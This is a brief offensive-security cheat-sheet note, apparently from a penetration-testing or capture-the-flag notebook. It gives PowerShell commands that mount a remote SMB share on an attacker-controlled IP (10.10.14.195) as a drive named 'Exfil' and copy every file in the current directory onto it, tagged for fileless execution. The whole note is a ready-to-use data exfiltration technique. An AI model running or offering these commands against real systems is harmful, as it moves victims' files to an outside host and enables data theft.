Tips:
```Powershell
PS C:\> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
PS C:\> New-PSDrive -Name "Exfil" -PsProvider "Filesystem" -Root "\\10.10.14.195\share"
PS C:\> copy * Exfil:\
```
Could be used in tandem with [[File Transfer]] 

# #fileless-execution 
